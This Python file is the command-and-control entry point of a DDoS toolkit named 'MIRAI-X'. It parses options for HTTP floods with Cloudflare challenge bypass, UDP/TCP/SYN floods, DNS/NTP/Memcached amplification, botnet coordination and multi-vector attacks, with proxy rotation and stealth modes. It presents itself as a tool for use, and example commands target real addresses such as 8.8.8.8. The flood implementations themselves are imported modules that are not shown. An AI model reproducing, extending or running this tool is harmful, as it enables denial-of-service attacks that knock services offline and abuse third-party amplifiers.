import argparse
import asyncio
import time
from typing import List, Dict, Any, Optional
import json
import os

from .config import load_config
from .attack_orchestrator import AttackOrchestrator
from .proxy_manager import ProxyManager
from .layer4_attacks import Layer4AttackManager
from .amplification_attacks import AmplificationAttackManager
from .botnet_coordinator import BotnetCoordinator
from .monitoring import AttackMonitor
from .utils import generate_attack_report

class AttackCommander:
    """
    Advanced attack command and control system supporting multiple attack vectors.
    """

    def __init__(self):
        self.config = load_config()
        self.attack_monitor = AttackMonitor()
        self.active_attacks = {}
        self.attack_results = {}

    def parse_arguments(self):
        """Parse command line arguments with enhanced attack options."""
        parser = argparse.ArgumentParser(
            description="MIRAI-X: Advanced Multi-Vector Attack Platform",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Attack Types:
  l7          - Layer 7 (HTTP) attacks with Cloudflare bypass
  l4          - Layer 4 (UDP/TCP/SYN) flood attacks
  amp         - Amplification attacks (DNS/NTP/SSDP/Memcached)
  botnet      - Distributed botnet coordination
  multi       - Multi-vector combined attack

HTTP Methods (for L7 attacks):
  GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS

Examples:
  python -m m.main --target https://example.com --attack-type l7 --method GET --rate 10000
  python -m m.main --target 192.168.1.1 --attack-type l4 --l4-method udp --port 80
  python -m m.main --target 8.8.8.8 --attack-type amp --amp-method dns --workers 50
  python -m m.main --botnet-file bots.txt --attack-type botnet --coordination-server
            """
        )

        # Basic attack parameters
        parser.add_argument("--target", required=True,
                          help="Target (URL for L7, IP for L4/Amp, Domain for DNS Amp)")
        parser.add_argument("--attack-type", required=True,
                          choices=["l7", "l4", "amp", "botnet", "multi"],
                          help="Type of attack to launch")

        # Layer 7 specific parameters
        l7_group = parser.add_argument_group("Layer 7 Attack Parameters")
        l7_group.add_argument("--method", default="GET",
                            choices=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"],
                            help="HTTP method for L7 attacks")
        l7_group.add_argument("--rate", type=int, default=1000,
                            help="Target requests per second per worker")
        l7_group.add_argument("--workers", type=int, default=10,
                            help="Number of concurrent attack workers")
        l7_group.add_argument("--post-data", help="JSON string for POST/PUT request body")
        l7_group.add_argument("--headers-file", help="Path to JSON file with custom headers")
        l7_group.add_argument("--challenge-solver-mode",
                            choices=["headless_browser", "js_engine_parse", "advanced_stealth"],
                            default="headless_browser",
                            help="Mode for solving Cloudflare challenges")
        l7_group.add_argument("--user-agent-file", help="Path to file with User-Agents to rotate")

        # Layer 4 specific parameters
        l4_group = parser.add_argument_group("Layer 4 Attack Parameters")
        l4_group.add_argument("--l4-method", default="udp",
                            choices=["udp", "tcp", "syn", "ack", "icmp"],
                            help="Layer 4 attack method")
        l4_group.add_argument("--port", type=int, default=80,
                            help="Target port for L4 attacks")
        l4_group.add_argument("--packet-size", type=int, default=1024,
                            help="Packet size for UDP/TCP floods")
        l4_group.add_argument("--threads", type=int, default=100,
                            help="Number of attack threads for L4")

        # Amplification attack parameters
        amp_group = parser.add_argument_group("Amplification Attack Parameters")
        amp_group.add_argument("--amp-method", default="dns",
                             choices=["dns", "ntp", "ssdp", "memcached", "chargen", "snmp"],
                             help="Amplification method")
        amp_group.add_argument("--amplifier-file",
                             help="File containing list of vulnerable amplifiers")
        amp_group.add_argument("--reflection-ratio", type=float, default=50.0,
                             help="Expected amplification ratio")

        # Botnet parameters
        botnet_group = parser.add_argument_group("Botnet Parameters")
        botnet_group.add_argument("--botnet-file", help="File containing botnet node list")
        botnet_group.add_argument("--botnet-key", help="Encryption key for botnet communication")
        botnet_group.add_argument("--coordination-server", action="store_true",
                                help="Run as coordination server for botnet")
        botnet_group.add_argument("--listen-port", type=int, default=6667,
                                help="Port for botnet coordination server")

        # Multi-vector parameters
        multi_group = parser.add_argument_group("Multi-Vector Attack Parameters")
        multi_group.add_argument("--vector-intensity",
                               choices=["low", "medium", "high", "extreme"],
                               default="high",
                               help="Intensity level for multi-vector attacks")
        multi_group.add_argument("--adaptive-mode", action="store_true",
                               help="Enable adaptive attack scaling based on target response")

        # General parameters
        parser.add_argument("--duration", type=int, default=0,
                          help="Attack duration in seconds (0 for indefinite)")
        parser.add_argument("--proxy-file",
                          help="Path to file containing proxies (IP:PORT or USER:PASS@IP:PORT)")
        parser.add_argument("--output-dir", default="attack_reports",
                          help="Directory to save attack reports and logs")
        parser.add_argument("--stealth-mode", action="store_true",
                          help="Enable maximum stealth and fingerprint randomization")
        parser.add_argument("--debug", action="store_true",
                          help="Enable debug output")

        return parser.parse_args()

    async def initialize_attack_infrastructure(self, args):
        """Initialize common attack infrastructure."""
        # Create output directory if it doesn't exist
        os.makedirs(args.output_dir, exist_ok=True)

        # Initialize proxy manager if proxies are specified
        proxy_manager = None
        if args.proxy_file or args.attack_type == "l7":
            proxy_manager = ProxyManager(
                proxy_file=args.proxy_file or self.config.get('proxy_file'),
                check_interval=self.config.get('proxy_check_interval', 300)
            )
            await proxy_manager.load_and_health_check_proxies()

        return proxy_manager

    async def launch_l7_attack(self, args, proxy_manager):
        """Launch Layer 7 HTTP attack."""
        print("🚀 Launching Advanced Layer 7 Attack...")
        print(f"Target: {args.target}")
        print(f"Method: {args.method}")
        print(f"Rate: {args.rate} RPS per worker")
        print(f"Workers: {args.workers}")

        orchestrator = AttackOrchestrator(
            target_url=args.target,
            method=args.method,
            rate=args.rate,
            workers=args.workers,
            proxy_manager=proxy_manager,
            duration=args.duration,
            post_data=args.post_data,
            custom_headers=args.headers_file,
            user_agent_file=args.user_agent_file,
            challenge_solver_mode=args.challenge_solver_mode,
            stealth_mode=args.stealth_mode
        )

        attack_id = f"l7_{int(time.time())}"
        self.active_attacks[attack_id] = orchestrator

        # Start monitoring
        await self.attack_monitor.start_monitoring(attack_id, args.target)

        try:
            await orchestrator.start_attack()
        finally:
            # Stop monitoring and generate report
            metrics = await self.attack_monitor.stop_monitoring(attack_id)
            self.attack_results[attack_id] = metrics

            # Generate attack report
            report_file = generate_attack_report(
                attack_id, args, metrics, args.output_dir
            )
            print(f"📊 Attack report saved to: {report_file}")

    async def launch_l4_attack(self, args, proxy_manager):
        """Launch Layer 4 flood attack."""
        print("🌊 Launching Layer 4 Flood Attack...")
        print(f"Target: {args.target}")
        print(f"Method: {args.l4_method}")
        print(f"Port: {args.port}")
        print(f"Packet Size: {args.packet_size}")
        print(f"Threads: {args.threads}")

        l4_manager = Layer4AttackManager(
            target_ip=args.target,
            method=args.l4_method,
            port=args.port,
            packet_size=args.packet_size,
            threads=args.threads,
            duration=args.duration,
            stealth_mode=args.stealth_mode
        )

        attack_id = f"l4_{int(time.time())}"
        self.active_attacks[attack_id] = l4_manager

        # Start monitoring
        await self.attack_monitor.start_monitoring(attack_id, args.target)

        try:
            result = l4_manager.start_attack()
            return result
        finally:
            metrics = await self.attack_monitor.stop_monitoring(attack_id)
            self.attack_results[attack_id] = metrics

            report_file = generate_attack_report(
                attack_id, args, metrics, args.output_dir
            )
            print(f"📊 Attack report saved to: {report_file}")

    async def launch_amplification_attack(self, args, proxy_manager):
        """Launch amplification attack."""
        print("📡 Launching Amplification Attack...")
        print(f"Target: {args.target}")
        print(f"Method: {args.amp_method}")
        print(f"Expected Ratio: {args.reflection_ratio}x")

        amp_manager = AmplificationAttackManager(
            target=args.target,
            method=args.amp_method,
            amplifier_file=args.amplifier_file,
            reflection_ratio=args.reflection_ratio,
            duration=args.duration,
            stealth_mode=args.stealth_mode
        )

        attack_id = f"amp_{int(time.time())}"
        self.active_attacks[attack_id] = amp_manager

        # Start monitoring
        await self.attack_monitor.start_monitoring(attack_id, args.target)

        try:
            result = amp_manager.start_attack()
            return result
        finally:
            metrics = await self.attack_monitor.stop_monitoring(attack_id)
            self.attack_results[attack_id] = metrics

            report_file = generate_attack_report(
                attack_id, args, metrics, args.output_dir
            )
            print(f"📊 Attack report saved to: {report_file}")

    async def launch_botnet_attack(self, args, proxy_manager):
        """Launch botnet-coordinated attack."""
        print("🤖 Launching Botnet Attack...")
        print(f"Botnet File: {args.botnet_file}")
        print(f"Coordination Server: {'Enabled' if args.coordination_server else 'Disabled'}")

        coordinator = BotnetCoordinator(
            botnet_file=args.botnet_file,
            encryption_key=args.botnet_key,
            is_server=args.coordination_server,
            listen_port=args.listen_port,
            target=args.target,
            duration=args.duration
        )

        attack_id = f"botnet_{int(time.time())}"
        self.active_attacks[attack_id] = coordinator

        # Start monitoring
        await self.attack_monitor.start_monitoring(attack_id, args.target)

        try:
            result = await coordinator.start_coordination()
            return result
        finally:
            metrics = await self.attack_monitor.stop_monitoring(attack_id)
            self.attack_results[attack_id] = metrics

            report_file = generate_attack_report(
                attack_id, args, metrics, args.output_dir
            )
            print(f"📊 Attack report saved to: {report_file}")

    async def launch_multi_vector_attack(self, args, proxy_manager):
        """Launch multi-vector combined attack."""
        print("⚡ Launching Multi-Vector Attack...")
        print(f"Target: {args.target}")
        print(f"Intensity: {args.vector_intensity}")
        print(f"Adaptive Mode: {'Enabled' if args.adaptive_mode else 'Disabled'}")

        # Import multi-vector orchestrator
        from .multi_vector_orchestrator import MultiVectorOrchestrator

        mv_orchestrator = MultiVectorOrchestrator(
            target=args.target,
            intensity=args.vector_intensity,
            adaptive_mode=args.adaptive_mode,
            duration=args.duration,
            proxy_manager=proxy_manager,
            stealth_mode=args.stealth_mode
        )

        attack_id = f"multi_{int(time.time())}"
        self.active_attacks[attack_id] = mv_orchestrator

        # Start monitoring
        await self.attack_monitor.start_monitoring(attack_id, args.target)

        try:
            result = await mv_orchestrator.start_multi_vector_attack()
            return result
        finally:
            metrics = await self.attack_monitor.stop_monitoring(attack_id)
            self.attack_results[attack_id] = metrics

            report_file = generate_attack_report(
                attack_id, args, metrics, args.output_dir
            )
            print(f"📊 Attack report saved to: {report_file}")

    async def run_attack(self, args):
        """Main attack execution method."""
        print("🔥 MIRAI-X Attack Platform Starting...")

        # Initialize attack infrastructure
        proxy_manager = await self.initialize_attack_infrastructure(args)

        # Route to appropriate attack method
        if args.attack_type == "l7":
            await self.launch_l7_attack(args, proxy_manager)
        elif args.attack_type == "l4":
            await self.launch_l4_attack(args, proxy_manager)
        elif args.attack_type == "amp":
            await self.launch_amplification_attack(args, proxy_manager)
        elif args.attack_type == "botnet":
            await self.launch_botnet_attack(args, proxy_manager)
        elif args.attack_type == "multi":
            await self.launch_multi_vector_attack(args, proxy_manager)

        print("✅ Attack completed successfully!")

    def main(self):
        """Main entry point."""
        args = self.parse_arguments()

        # Override config with command line arguments
        for key, value in vars(args).items():
            if value is not None:
                self.config[key] = value

        try:
            asyncio.run(self.run_attack(args))
        except KeyboardInterrupt:
            print("\n⚠️ Attack interrupted by user")
        except Exception as e:
            print(f"❌ Attack failed: {e}")
            if args.debug:
                import traceback
                traceback.print_exc()

def main():
    """Legacy main function for backward compatibility."""
    commander = AttackCommander()
    commander.main()

if __name__ == "__main__":
    main()
    